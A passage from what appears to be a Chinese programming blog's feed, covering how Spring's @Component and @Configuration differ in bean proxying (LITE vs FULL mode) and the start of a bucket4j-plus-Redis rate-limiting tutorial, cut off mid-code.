<span class="built_in">max</span>(dp[<span class="number">0</span>], dp[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：三个状态：未持有股票未售卖；持有股票；持有股票刚售卖。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot注解：Component与Configure</title>
      <link href="/post/59dcc30f.html"/>
      <url>/post/59dcc30f.html</url>
      
        <content type="html"><![CDATA[<p><code>@Component</code>和<code>@Configure</code>都是在SpringBoot中用于配置的常见注解，一个多用于自动化配置，另一个多用于第三方库的Config配置。</p><h2 id="一、注解定义"><a href="#一、注解定义" class="headerlink" title="一、注解定义"></a>一、注解定义</h2><p>两者定义分别如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @Component的定义</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Indexed</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Component &#123;</span><br><span class="line">​</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * The value may indicate a suggestion for a logical component name,</span></span><br><span class="line"><span class="comment">   * to be turned into a Spring bean in case of an autodetected component.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> the suggested component name, if any (or empty String otherwise)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  String <span class="title function_">value</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">​</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @Configure的定义</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Configuration &#123;</span><br><span class="line">​</span><br><span class="line">  <span class="meta">@AliasFor(annotation = Component.class)</span></span><br><span class="line">  String <span class="title function_">value</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">​</span><br><span class="line">  <span class="type">boolean</span> <span class="title function_">proxyBeanMethods</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">true</span>;</span><br><span class="line">​</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很显然，<code>@Configure</code>注解本质上也是<code>@Component</code>，因此<code>@ComponentScan</code>能扫描到<code>@Configure</code>注解的类。</p><h2 id="二、注解使用"><a href="#二、注解使用" class="headerlink" title="二、注解使用"></a>二、注解使用</h2><p>在SpringBoot中，对于配置类来讲，大体可以分为两类，一类是<strong>LITE模式</strong>，另一类是<strong>FULL模式</strong>，<code>@Component</code>注解对应前者，而<code>@Configure</code>注解对应后者。</p><p>使用<code>@Component</code>实现配置类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppConfig</span> &#123;</span><br><span class="line">  <span class="meta">@Bean</span></span><br><span class="line">  <span class="keyword">public</span> Foo <span class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;foo() invoked...&quot;</span>);</span><br><span class="line">    <span class="type">Foo</span> <span class="variable">foo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Foo</span>();</span><br><span class="line">    System.out.println(<span class="string">&quot;foo() 方法的 foo hashcode: &quot;</span> + foo.hashCode());</span><br><span class="line">    <span class="keyword">return</span> foo;</span><br><span class="line">  &#125;</span><br><span class="line">​</span><br><span class="line">  <span class="meta">@Bean</span></span><br><span class="line">  <span class="keyword">public</span> Eoo <span class="title function_">eoo</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;eoo() invoked...&quot;</span>);</span><br><span class="line">    <span class="type">Foo</span> <span class="variable">foo</span> <span class="operator">=</span> foo();</span><br><span class="line">    System.out.println(<span class="string">&quot;eoo() 方法的 foo hashcode: &quot;</span>+ foo.hashCode());</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Eoo</span>();</span><br><span class="line">  &#125;</span><br><span class="line">​</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(AppConfig.class);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">foo() invoked...</span><br><span class="line">foo() 方法的 foo hashcode: 815992954</span><br><span class="line">eoo() invoked...</span><br><span class="line">foo() invoked...</span><br><span class="line">foo() 方法的 foo hashcode: 868737467</span><br><span class="line">eoo() 方法的 foo hashcode: 868737467</span><br></pre></td></tr></table></figure><p>我们可以注意到，<code>@Bean</code>注解的<code>foo()</code>方法和<code>eoo()</code>方法执行的<code>foo()</code>方法来自不同的<code>foo</code>对象，但是当我们换成使用<code>@Configure</code>注解时，执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foo() invoked...</span><br><span class="line">foo() 方法的 foo hashcode: 849373393</span><br><span class="line">eoo() invoked...</span><br><span class="line">eoo() 方法的 foo hashcode: 849373393</span><br></pre></td></tr></table></figure><p>显然<code>foo()</code>方法只执行了一次，<code>foo</code>对象只产生了一个，这就是<code>@Component</code>和<code>@Configure</code>的区别现象展示。简单地解释这个现象就是当调用<code>foo()</code>这个方法时，都去容器获取<code>foo</code>这个Bean即可，而要做到这一点可以使用<strong>代理</strong>，也就是说<code>@Configure</code>注解的类会被代理，更加准确的说是一个类的BeanDefinition的Attribute中有<strong>FULL</strong>配置属性，那么这个类就会被Spring代理。</p><h2 id="三、如何实现FULL配置的代理"><a href="#三、如何实现FULL配置的代理" class="headerlink" title="三、如何实现FULL配置的代理"></a>三、如何实现FULL配置的代理</h2><p>重要的一点在于SpringBoot在什么时间将这些配置类转变为FULL模式或者是LITE模式，需要先了解一个关键的类：<code>ConfigurationClassPostProcessor</code>。</p><h3 id="3-1-ConfigurationClassPostProcessor是什么"><a href="#3-1-ConfigurationClassPostProcessor是什么" class="headerlink" title="3.1 ConfigurationClassPostProcessor是什么"></a>3.1 ConfigurationClassPostProcessor是什么</h3><p>这个类的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigurationClassPostProcessor</span> <span class="keyword">implements</span> </span><br><span class="line">                                    <span class="title class_">BeanDefinitionRegistryPostProcessor</span>,</span><br><span class="line">                                    PriorityOrdered, </span><br><span class="line">                                    ResourceLoaderAware, </span><br><span class="line">                                    BeanClassLoaderAware, </span><br><span class="line">                                    EnvironmentAware &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由这个类定义可知这个类的类型为BeanDefinitionRegistryPostProcessor，以及实现了众多Spring内置的Aware接口。</p><h3 id="3-2-ConfigurationClassPostProcessor在什么时间被实例化"><a href="#3-2-ConfigurationClassPostProcessor在什么时间被实例化" class="headerlink" title="3.2 ConfigurationClassPostProcessor在什么时间被实例化"></a>3.2 ConfigurationClassPostProcessor在什么时间被实例化</h3><p>需要先明确一个前提，那就是ConfigurationClassPostProcessor这个类对应的BeanDefinition在什么时间注册到Spring的容器中的，因为Spring的实例化比较特殊，主要是基于BeanDefinition来处理的，那么现在这个问题就可以转变为ConfigurationClassPostProcessor这个类是在什么时间被注册为一个Beandefinition的？这个可以在源代码中找到答案，具体其实就是在初始化这个Spring容器的时候。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(ConfigClass.class)</span><br><span class="line">  -&gt; <span class="keyword">new</span> <span class="title class_">AnnotatedBeanDefinitionReader</span>(<span class="built_in">this</span>);</span><br><span class="line">    -&gt; AnnotationConfigUtils.registerAnnotationConfigProcessors(<span class="built_in">this</span>.registry);</span><br><span class="line">      -&gt; <span class="keyword">new</span> <span class="title class_">RootBeanDefinition</span>(ConfigurationClassPostProcessor.class);</span><br><span class="line">        -&gt; registerPostProcessor(BeanDefinitionRegistry registry, RootBeanDefinition definition, String beanName)</span><br></pre></td></tr></table></figure><p>从这里可以看出，ConfigurationClassPostProcessor已经被注册为了一个BeanDefinition。</p><h3 id="3-3-Component与-Configuration的实现区别"><a href="#3-3-Component与-Configuration的实现区别" class="headerlink" title="3.3 @Component与@Configuration的实现区别"></a>3.3 @Component与@Configuration的实现区别</h3><p>上面ConfigurationClassPostProcessor已经注册到BeanDefinition注册中心了，说明Spring会在某个时间点将其处理成一个Bean，那么具体的时间点就是在BeanFactory所有的后置处理器的处理过程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AbstractApplicationContext</span><br><span class="line">  -&gt; refresh()</span><br><span class="line">    -&gt; invokeBeanFactoryPostProcessors(beanFactory);</span><br><span class="line">      -&gt; PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(beanFactory, getBeanFactoryPostProcessors());</span><br></pre></td></tr></table></figure><p>这个处理BeanFactory的后置处理器简单说来就是主要处理所有实现了BeanFactoryPostProcessor及BeanDefinitionRegistryPostProcessor的类，当然ConfigurationClassPostProcessor就是其中的一个，那么接下来我们看看实现的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postProcessBeanDefinitionRegistry</span><span class="params">(BeanDefinitionRegistry registry)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">registryId</span> <span class="operator">=</span> System.identityHashCode(registry);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.registriesPostProcessed.contains(registryId)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">          <span class="string">&quot;postProcessBeanDefinitionRegistry already called on this post-processor against &quot;</span> + registry);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.factoriesPostProcessed.contains(registryId)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">          <span class="string">&quot;postProcessBeanFactory already called on this post-processor against &quot;</span> + registry);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.registriesPostProcessed.add(registryId);</span><br><span class="line">​</span><br><span class="line">    processConfigBeanDefinitions(registry);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postProcessBeanFactory</span><span class="params">(ConfigurableListableBeanFactory beanFactory)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">factoryId</span> <span class="operator">=</span> System.identityHashCode(beanFactory);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.factoriesPostProcessed.contains(factoryId)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">          <span class="string">&quot;postProcessBeanFactory already called on this post-processor against &quot;</span> + beanFactory);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.factoriesPostProcessed.add(factoryId);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.registriesPostProcessed.contains(factoryId)) &#123;</span><br><span class="line">      <span class="comment">// BeanDefinitionRegistryPostProcessor hook apparently not supported...</span></span><br><span class="line">      <span class="comment">// Simply call processConfigurationClasses lazily at this point then.</span></span><br><span class="line">      processConfigBeanDefinitions((BeanDefinitionRegistry) beanFactory);</span><br><span class="line">    &#125;</span><br><span class="line">​</span><br><span class="line">    enhanceConfigurationClasses(beanFactory);</span><br><span class="line">    beanFactory.addBeanPostProcessor(<span class="keyword">new</span> <span class="title class_">ImportAwareBeanPostProcessor</span>(beanFactory));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>第一个方法主要完成了内部类，<code>@Component</code>，<code>@ComponentScan</code>，<code>@Bean</code>，<code>@Configuration</code>，<code>@Import</code>等等注解的处理，<code>processConfigBeanDefinitions()</code>把<code>@Configuration</code>类里所有<code>@Bean</code>、<code>@Import</code>、<code>@ComponentScan</code>等再解析一遍，生成新的BeanDefinition塞回注册表(属性设置为FULL)。然后生成对应的BeanDefinition，另一个方法就是对<code>@Configuration</code>使用CGLIB进行增强。</p><p>在第一个方法中的<code>processConfigBeanDefinitions()</code>方法中有一个<code>checkConfigurationClassCandidate()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkConfigurationClassCandidate</span><span class="params">(</span></span><br><span class="line"><span class="params">    BeanDefinition beanDef, MetadataReaderFactory metadataReaderFactory)</span> &#123;</span><br><span class="line">    </span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    Map&lt;String, Object&gt; config = metadata.getAnnotationAttributes(Configuration.class.getName());</span><br><span class="line">    <span class="keyword">if</span> (config != <span class="literal">null</span> &amp;&amp; !Boolean.FALSE.equals(config.get(<span class="string">&quot;proxyBeanMethods&quot;</span>))) &#123;</span><br><span class="line">        beanDef.setAttribute(CONFIGURATION_CLASS_ATTRIBUTE, CONFIGURATION_CLASS_FULL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (config != <span class="literal">null</span> || isConfigurationCandidate(metadata)) &#123;</span><br><span class="line">        beanDef.setAttribute(CONFIGURATION_CLASS_ATTRIBUTE, CONFIGURATION_CLASS_LITE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...      </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据程序的判断可知，如果一个类被<code>@Configuration</code>标注且代理模式为true，那么这个类对应的<strong>BeanDefinition</strong>将会被Spring添加一个FULL配置模式的属性，这个”属性“在Spring中有一个特定的接口就是AttributeAccessor，BeanDefinition就是继承了这个接口。</p><p>在这里也能看到<code>@Configuration(proxyBeanMethods = false)</code>和<code>@Component</code>一样效果，都是LITE模式。</p><p>最后则是由<code>enhanceConfigurationClasses()</code>方法对<code>@Configuration</code>注解标注的类的增强，进行CGLIB代理，代码就不展示了，CGLIB的原理可以看我的另一篇文章<a href="https://re-char.github.io/post/d45f1ea9.html">Java代理模式: JDK代理与CGLIB代理</a>。</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>一句话概括就是<code>@Configuration</code>中所有带<code>@Bean</code>注解的方法都会被动态代理，因此调用该方法返回的都是同一个实例。</p>]]></content>
      
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用bucket4j+redis实现统一限流机制</title>
      <link href="/post/5e36398c.html"/>
      <url>/post/5e36398c.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：暑期课云原生<del>(云原神)</del>期末大作业的bonus部分需要实现统一限流机制，组长大懒狗不想做交给我完成这个部分，期间踩了很多坑，故有了这篇文章。</p><h2 id="一、导入依赖包："><a href="#一、导入依赖包：" class="headerlink" title="一、导入依赖包："></a>一、导入依赖包：</h2><p>在<code>pom.xml</code>里导入以下依赖包，主要用了bucket4j：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.redisson<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>redisson-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.17.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.vladimir-bukhtoyarov<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>bucket4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.6.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.vladimir-bukhtoyarov<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>bucket4j-jcache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.6.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>记住需要导入<code>jcache</code>包。</p><h2 id="二、配置部分"><a href="#二、配置部分" class="headerlink" title="二、配置部分"></a>二、配置部分</h2><p>在你的项目配置文件中配置<code>redis</code>需要的配置(这里我的配置文件是properties格式)：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring.redis.host</span>=<span class="string">your_server_host_ip</span></span><br><span class="line"><span class="comment"># 端口一般都是6379</span></span><br><span class="line"><span class="attr">spring.redis.port</span>=<span class="string">6379 </span></span><br><span class="line"><span class="attr">spring.redis.password</span>=<span class="string">your_redis_password</span></span><br><span class="line"><span class="attr">spring.redis.timeout</span>=<span class="string">2000ms</span></span><br><span class="line"><span class="attr">spring.redis.database</span>=<span class="string">0</span></span><br></pre></td></tr></table></figure><ul><li>如果没有设置密码的话不用加上password的配置，但是不安全建议加上。</li><li>如果你的redis是开在另一台服务器上的话，记得开放那台服务器的6379端口。</li></ul><h2 id="三、代码部分"><a href="#三、代码部分" class="headerlink" title="三、代码部分"></a>三、代码部分</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io.github.bucket4j.Bandwidth;</span><br><span class="line"><span class="keyword">import</span> io.github.bucket4j.Bucket;</span><br><span class="line"><span class="keyword">import</span> io.github.bucket4j.BucketConfiguration;</span><br><span class="line"><span class="keyword">import</span> io.github.bucket4j.Refill;</span><br><span class="line"><span class="keyword">import</span> io.github.bucket4j.distributed.proxy.ProxyManager;</span><br><span class="line"><span class="keyword">import</span> io.github.bucket4j.grid.jcache.JCacheProxyManager;</span><br><span class="line"><span class="keyword">import</span> org.redisson.config.Config;</span><br><span class="line"><span class="keyword">import</span> org.redisson.jcache.configuration.RedissonConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.cache.CacheManager;</span><br><span class="line"><span class="keyword">import</span> javax.cache.Caching;</span><br><span class="line"><span class="keyword">import</span> java.time.Duration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.redis.host:your_server_host_ip&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String redisHost;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.redis.port:6379&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> redisPort;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.redis.password:your_redis_password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String redisPassword;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Config <span class="title function_">config</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Config</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Config</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> <span class="string">&quot;redis://&quot;</span> + redisHost + <span class="string">&quot;:&quot;</span> + redisPort;</span><br><span class="line">        config.useSingleServer()</span><br><span class="line">                .setAddress(address)</span><br><span class="line">                .setPassword(redisPassword);</span><br><span class="line">        <span class="keyword">return</span> config;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CacheManager <span class="title function_">cacheManager</span><span class="params">(Config config)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CacheManager</span> <span class="variable">cacheManager</span> <span class="operator">=</span> Caching.getCachingProvider(<span class="string">&quot;org.redisson.jcache.JCachingProvider&quot;</span>)</span><br><span class="line">                    .getCacheManager();</span><br><span class="line">            cacheManager.createCache(<span class="string">&quot;cache&quot;</span>, RedissonConfiguration.fromConfig(config));</span><br><span class="line">            <span class="keyword">return</span> cacheManager;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ProxyManager&lt;String&gt; <span class="title function_">proxyManager</span><span class="params">(CacheManager cacheManager)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ProxyManager&lt;String&gt; manager = <span class="keyword">new</span> <span class="title class_">JCacheProxyManager</span>&lt;&gt;(cacheManager.getCache(<span class="string">&quot;cache&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> manager;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Bucket <span class="title function_">bucket</span><span class="params">(ProxyManager&lt;String&gt; proxyManager, CacheManager cacheManager)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 这里清除了旧的cache，确保每次启动都会是新的bucket</span></span><br><span class="line">            javax.cache.Cache&lt;String, Object&gt; cache = cacheManager.getCache(<span class="string">&quot;cache&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cache != <span class="literal">null</span>) cache.clear();</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">bucketKey</span> <span 